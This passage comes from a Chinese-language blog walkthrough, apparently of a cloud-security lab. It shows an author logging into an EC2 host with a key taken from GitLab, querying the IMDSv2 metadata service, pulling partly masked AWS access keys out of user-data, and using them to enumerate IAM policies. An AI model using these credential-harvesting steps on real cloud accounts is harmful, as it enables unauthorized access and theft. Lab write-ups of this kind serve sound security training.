class="attr">&quot;RootDeviceName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/dev/sda1&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;RootDeviceType&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ebs&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;SecurityGroups&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                        <span class="punctuation">&#123;</span></span><br><span class="line">                            <span class="attr">&quot;GroupId&quot;</span><span class="punctuation">:</span> <span class="string">&quot;sg-02bfdf237bd43e0a7&quot;</span><span class="punctuation">,</span></span><br><span class="line">                            <span class="attr">&quot;GroupName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Child Two Internal SG&quot;</span></span><br><span class="line">                        <span class="punctuation">&#125;</span></span><br><span class="line">                    <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;SourceDestCheck&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;Tags&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                        <span class="punctuation">&#123;</span></span><br><span class="line">                            <span class="attr">&quot;Key&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Name&quot;</span><span class="punctuation">,</span></span><br><span class="line">                            <span class="attr">&quot;Value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;OIDC&quot;</span></span><br><span class="line">                        <span class="punctuation">&#125;</span></span><br><span class="line">                    <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;VirtualizationType&quot;</span><span class="punctuation">:</span> <span class="string">&quot;hvm&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;CpuOptions&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                        <span class="attr">&quot;CoreCount&quot;</span><span class="punctuation">:</span> <span class="number">1</span><span class="punctuation">,</span></span><br><span class="line">                        <span class="attr">&quot;ThreadsPerCore&quot;</span><span class="punctuation">:</span> <span class="number">1</span></span><br><span class="line">                    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;CapacityReservationSpecification&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                        <span class="attr">&quot;CapacityReservationPreference&quot;</span><span class="punctuation">:</span> <span class="string">&quot;open&quot;</span></span><br><span class="line">                    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;HibernationOptions&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                        <span class="attr">&quot;Configured&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span></span><br><span class="line">                    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;MetadataOptions&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                        <span class="attr">&quot;State&quot;</span><span class="punctuation">:</span> <span class="string">&quot;applied&quot;</span><span class="punctuation">,</span></span><br><span class="line">                        <span class="attr">&quot;HttpTokens&quot;</span><span class="punctuation">:</span> <span class="string">&quot;required&quot;</span><span class="punctuation">,</span></span><br><span class="line">                        <span class="attr">&quot;HttpPutResponseHopLimit&quot;</span><span class="punctuation">:</span> <span class="number">2</span><span class="punctuation">,</span></span><br><span class="line">                        <span class="attr">&quot;HttpEndpoint&quot;</span><span class="punctuation">:</span> <span class="string">&quot;enabled&quot;</span><span class="punctuation">,</span></span><br><span class="line">                        <span class="attr">&quot;HttpProtocolIpv6&quot;</span><span class="punctuation">:</span> <span class="string">&quot;disabled&quot;</span><span class="punctuation">,</span></span><br><span class="line">                        <span class="attr">&quot;InstanceMetadataTags&quot;</span><span class="punctuation">:</span> <span class="string">&quot;disabled&quot;</span></span><br><span class="line">                    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;EnclaveOptions&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                        <span class="attr">&quot;Enabled&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span></span><br><span class="line">                    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;BootMode&quot;</span><span class="punctuation">:</span> <span class="string">&quot;uefi-preferred&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;PlatformDetails&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Linux/UNIX&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;UsageOperation&quot;</span><span class="punctuation">:</span> <span class="string">&quot;RunInstances&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;UsageOperationUpdateTime&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2025-09-22T12:49:59+00:00&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;PrivateDnsNameOptions&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                        <span class="attr">&quot;HostnameType&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ip-name&quot;</span><span class="punctuation">,</span></span><br><span class="line">                        <span class="attr">&quot;EnableResourceNameDnsARecord&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">                        <span class="attr">&quot;EnableResourceNameDnsAAAARecord&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span></span><br><span class="line">                    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;MaintenanceOptions&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                        <span class="attr">&quot;AutoRecovery&quot;</span><span class="punctuation">:</span> <span class="string">&quot;default&quot;</span><span class="punctuation">,</span></span><br><span class="line">                        <span class="attr">&quot;RebootMigration&quot;</span><span class="punctuation">:</span> <span class="string">&quot;default&quot;</span></span><br><span class="line">                    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;CurrentInstanceBootMode&quot;</span><span class="punctuation">:</span> <span class="string">&quot;legacy-bios&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;NetworkPerformanceOptions&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                        <span class="attr">&quot;BandwidthWeighting&quot;</span><span class="punctuation">:</span> <span class="string">&quot;default&quot;</span></span><br><span class="line">                    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;Operator&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                        <span class="attr">&quot;Managed&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span></span><br><span class="line">                    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;InstanceId&quot;</span><span class="punctuation">:</span> <span class="string">&quot;i-08340f4fffab9324a&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;ImageId&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ami-0e53341489b04c826&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;State&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                        <span class="attr">&quot;Code&quot;</span><span class="punctuation">:</span> <span class="number">16</span><span class="punctuation">,</span></span><br><span class="line">                        <span class="attr">&quot;Name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;running&quot;</span></span><br><span class="line">                    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;PrivateDnsName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ip-10-1-20-57.us-west-2.compute.internal&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;PublicDnsName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;StateTransitionReason&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;AmiLaunchIndex&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;ProductCodes&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;InstanceType&quot;</span><span class="punctuation">:</span> <span class="string">&quot;t2.micro&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;LaunchTime&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2025-09-22T12:49:59+00:00&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;Placement&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                        <span class="attr">&quot;AvailabilityZoneId&quot;</span><span class="punctuation">:</span> <span class="string">&quot;usw2-az2&quot;</span><span class="punctuation">,</span></span><br><span class="line">                        <span class="attr">&quot;GroupName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">                        <span class="attr">&quot;Tenancy&quot;</span><span class="punctuation">:</span> <span class="string">&quot;default&quot;</span><span class="punctuation">,</span></span><br><span class="line">                        <span class="attr">&quot;AvailabilityZone&quot;</span><span class="punctuation">:</span> <span class="string">&quot;us-west-2a&quot;</span></span><br><span class="line">                    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;Monitoring&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                        <span class="attr">&quot;State&quot;</span><span class="punctuation">:</span> <span class="string">&quot;disabled&quot;</span></span><br><span class="line">                    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;SubnetId&quot;</span><span class="punctuation">:</span> <span class="string">&quot;subnet-06a9cf60bde2ecd54&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;VpcId&quot;</span><span class="punctuation">:</span> <span class="string">&quot;vpc-0453fadd63f4de860&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;PrivateIpAddress&quot;</span><span class="punctuation">:</span> <span class="string">&quot;10.1.20.57&quot;</span></span><br><span class="line">                <span class="punctuation">&#125;</span></span><br><span class="line">            <span class="punctuation">]</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>存在一台主机<code>10.1.20.57</code></p>
<p>然后就可以使用从gitlab获取到的密钥文件登录到机器上面</p>
<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202509222157188.png" alt="image-20250922215701039"></p>
<p>在这台主机上面并没有找到有用的信息</p>
<p>接下来可以尝试访问aws的元数据中心</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">louise@ip-10-1-20-57:~$ curl http://169.254.169.254/latest/meta-data</span><br><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;iso-8859-1&quot;</span>?&gt;</span><br><span class="line">&lt;!DOCTYPE html PUBLIC <span class="string">&quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot;</span></span><br><span class="line">        <span class="string">&quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;</span>&gt;</span><br><span class="line">&lt;html xmlns=<span class="string">&quot;http://www.w3.org/1999/xhtml&quot;</span> xml:lang=<span class="string">&quot;en&quot;</span> lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line"> &lt;<span class="built_in">head</span>&gt;</span><br><span class="line">  &lt;title&gt;401 - Unauthorized&lt;/title&gt;</span><br><span class="line"> &lt;/head&gt;</span><br><span class="line"> &lt;body&gt;</span><br><span class="line">  &lt;h1&gt;401 - Unauthorized&lt;/h1&gt;</span><br><span class="line"> &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>收到 401 未授权错误，则表示 IMDSv2 已启用。IMDSv1 不需要身份验证。</p>
<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202509222200560.png" alt="image-20250922220034452"></p>
<p>在<code>DescribeInstances</code>之前操作的输出中也可以验证这一点。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">TOKEN=`curl -X PUT &quot;http://169.254.169.254/latest/api/token&quot; -H &quot;X-aws-ec2-metadata-token-ttl-seconds: 21600&quot;` \</span><br><span class="line">&amp;&amp; curl -H &quot;X-aws-ec2-metadata-token: $TOKEN&quot; http://169.254.169.254/latest/meta-data/</span><br></pre></td></tr></table></figure>

<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202509222203766.png" alt="image-20250922220325657"></p>
<blockquote>
<p>Instance Metadata Service v2（IMDSv2）是 AWS 为 EC2 实例元数据访问引入的更安全的版本，用来减少通过 SSRF 等漏洞窃取实例临时凭证的风险。与早期的 IMDSv1 不同，IMDSv2 采用基于会话的访问：客户端先向 <code>http://169.254.169.254/latest/api/token</code> 发起一次 <code>PUT</code> 请求并携带 <code>X-aws-ec2-metadata-token-ttl-seconds</code> 以获取短期 session token，随后所有 metadata 请求都必须在头部带上 <code>X-aws-ec2-metadata-token: &lt;token&gt;</code>。这种两步走的设计（需要自定义方法和头部）以及可配置的 hop limit 大幅降低了简单 GET-only SSRF 的攻击成功率。虽然不是对所有高级攻击都万无一失，但 IMDSv2 显著提高了实用安全性；生产环境推荐通过实例元数据选项将 <code>http-tokens</code> 设为 <code>required</code>，强制只接受 IMDSv2 请求。</p>
</blockquote>
<p>输出中没有<code>iam</code>类别，因此该实例没有附加 IAM 实例角色。可以尝试检查一下<code>user-data</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">louise@ip-10-1-20-57:~$ TOKEN=`curl -X PUT <span class="string">&quot;http://169.254.169.254/latest/api/token&quot;</span> -H <span class="string">&quot;X-aws-ec2-metadata-token-ttl-seconds: 21600&quot;</span>` &amp;&amp; curl -H <span class="string">&quot;X-aws-ec2-metadata-token: <span class="variable">$TOKEN</span>&quot;</span> http://169.254.169.254/latest/user-data</span><br><span class="line">  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current</span><br><span class="line">                                 Dload  Upload   Total   Spent    Left  Speed</span><br><span class="line">100    56  100    56    0     0  30888      0 --:--:-- --:--:-- --:--:-- 56000</span><br><span class="line">--//</span><br><span class="line">Content-Type: text/cloud-config; charset=<span class="string">&quot;us-ascii&quot;</span></span><br><span class="line">MIME-Version: 1.0</span><br><span class="line">Content-Transfer-Encoding: 7bit</span><br><span class="line">Content-Disposition: attachment; filename=<span class="string">&quot;cloud-config.txt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#cloud-config</span></span><br><span class="line">cloud_final_modules:</span><br><span class="line">- [scripts-user, always]</span><br><span class="line"></span><br><span class="line">--//</span><br><span class="line">Content-Type: text/x-shellscript; charset=<span class="string">&quot;us-ascii&quot;</span></span><br><span class="line">MIME-Version: 1.0</span><br><span class="line">Content-Transfer-Encoding: 7bit</span><br><span class="line">Content-Disposition: attachment; filename=<span class="string">&quot;userdata.txt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Set AWS access keys</span></span><br><span class="line">AWS_ACCESS_KEY_ID=AKIA3G7*****LVQ4</span><br><span class="line">AWS_SECRET_ACCESS_KEY=Wpavn74pi**********n438v+w3/A+</span><br><span class="line"></span><br><span class="line">aws --profile bob configure <span class="built_in">set</span> aws_secret_access_key <span class="variable">$AWS_ACCESS_KEY_ID</span></span><br><span class="line">aws --profile bob configure <span class="built_in">set</span> aws_secret_access_key <span class="variable">$AWS_SECRET_ACCESS_KEY</span></span><br><span class="line"></span><br><span class="line">yum update -y</span><br><span class="line">yum install -y httpd</span><br><span class="line"></span><br><span class="line">systemctl start httpd</span><br><span class="line"></span><br><span class="line">systemctl <span class="built_in">enable</span> httpd</span><br><span class="line"><span class="built_in">mkdir</span> /var/www/html/hg_launch_website</span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> /var/www/html/hg_launch_website</span><br><span class="line">aws s3 <span class="built_in">cp</span> s3://huge-logistics-website-data/ ./</span><br><span class="line">--//--</span><br><span class="line">louise@ip-10-1-20-57:~$</span><br></pre></td></tr></table></figure>

<p>在这里泄露了<code>bob</code>的AKSK</p>
<p>配置好AKSK之后到这里就已经获取到了<code>bob</code>的权限了</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">yliken@LAPTOP<span class="number">-40</span>PQI58C<span class="punctuation">:</span>~/.cloudfox/cached-data/aws/<span class="number">770926735562</span>$ aws sts get-caller-identity --profile bob</span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;UserId&quot;</span><span class="punctuation">:</span> <span class="string">&quot;AIDA3G7WQODFNX5QXKTQ5&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;Account&quot;</span><span class="punctuation">:</span> <span class="string">&quot;770926735562&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;Arn&quot;</span><span class="punctuation">:</span> <span class="string">&quot;arn:aws:iam::770926735562:user/bob&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">yliken@LAPTOP<span class="number">-40</span>PQI58C<span class="punctuation">:</span>~/.aws$ aws iam get-policy-version --policy-arn arn<span class="punctuation">:</span>aws<span class="punctuation">:</span>iam<span class="punctuation">:</span><span class="punctuation">:</span><span class="number">770926735562</span><span class="punctuation">:</span>policy/engineering --version-id v1 --profile newlouise</span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;PolicyVersion&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;Document&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;Statement&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;Action&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                        <span class="string">&quot;ec2:DescribeInstances&quot;</span></span><br><span class="line">                    <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;Condition&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                        <span class="attr">&quot;StringEquals&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                            <span class="attr">&quot;aws:RequestedRegion&quot;</span><span class="punctuation">:</span> <span class="string">&quot;us-west-2&quot;</span></span><br><span class="line">                        <span class="punctuation">&#125;</span></span><br><span class="line">                    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;Effect&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Allow&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;Resource&quot;</span><span class="punctuation">:</span> <span class="string">&quot;*&quot;</span></span><br><span class="line">                <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;Action&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                        <span class="string">&quot;s3:ListBucket&quot;</span><span class="punctuation">,</span></span><br><span class="line">                        <span class="string">&quot;s3:GetObject&quot;</span></span><br><span class="line">                    <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;Effect&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Allow&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;Resource&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                        <span class="string">&quot;arn:aws:s3:::huge-logistics-engineering-95fbe89da4b9/*&quot;</span><span class="punctuation">,</span></span><br><span class="line">                        <span class="string">&quot;arn:aws:s3:::huge-logistics-engineering-95fbe89da4b9&quot;</span></span><br><span class="line">                    <span class="punctuation">]</span></span><br><span class="line">                <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;Action&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                        <span class="string">&quot;iam:ListAttachedUserPolicies&quot;</span><span class="punctuation">,</span></span><br><span class="line">                        <span class="string">&quot;iam:ListAttachedRolePolicies&quot;</span><span class="punctuation">,</span></span><br><span class="line">                        <span class="string">&quot;iam:GetPolicy&quot;</span><span class="punctuation">,</span></span><br><span class="line">                        <span class="string">&quot;iam:GetPolicyVersion&quot;</span></span><br><span class="line">                    <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;Effect&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Allow&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;Resource&quot;</span><span class="punctuation">:</span> <span class="string">&quot;*&quot;</span></span><br><span class="line">                <span class="punctuation">&#125;</span></span><br><span class="line">            <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2012-10-17&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;VersionId&quot;</span><span class="punctuation">:</span> <span class="string">&quot;v1&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;IsDefaultVersion&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;CreateDate&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2025-09-22T12:49:46+00:00&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>查看名为’engineering’的IAM策略的具体权限内容 engineering角色具有<code>iam:ListAttachedUserPolicies, iam:ListAttachedRolePolicies, iam:GetPolicy, iam:GetPolicyVersion</code>权限</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">yliken@LAPTOP<span class="number">-40</span>PQI58C<span class="punctuation">:</span>~/.aws$ aws iam get-policy-version --policy-arn arn<span class="punctuation">:</span>aws<span class="punctuation">:</span>iam<span class="punctuation">:</span><span class="punctuation">:</span><span class="number">770926735562</span><span class="punctuation">:</span>policy/engineering --version-id v1 --profile newlouise</span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;PolicyVersion&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;Document&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;Statement&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;Action&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                        <span class="string">&quot;ec2:DescribeInstances&quot;</span></span><br><span class="line">                    <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;Condition&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                        <span class="attr">&quot;StringEquals&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                            <span class="attr">&quot;aws:RequestedRegion&quot;</span><span class="punctuation">:</span> <span class="string">&quot;us-west-2&quot;</span></span><br><span class="line">                        <span class="punctuation">&#125;</span></span><br><span class="line">                    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;Effect&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Allow&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;Resource&quot;</span><span class="punctuation">:</span> <span class="string">&quot;*&quot;</span></span><br><span class="line">                <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;Action&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                        <span class="string">&quot;s3:ListBucket&quot;</span><span class="punctuation">,</span></span><br><span class="line">                        <span class="string">&quot;s3:GetObject&quot;</span></span><br><span class="line">                    <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;Effect&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Allow&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;Resource&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                        <span class="string">&quot;arn:aws:s3:::huge-logistics-engineering-95fbe89da4b9/*&quot;</span><span class="punctuation">,</span></span><br><span class="line">                        <span class="string">&quot;arn:aws:s3:::huge-logistics-engineering-95fbe89da4b9&quot;</span></span><br><span class="line">                    <span class="punctuation">]</span></span><br><span class="line">                <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;Action&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                        <span class="string">&quot;iam:ListAttachedUserPolicies&quot;</span><span 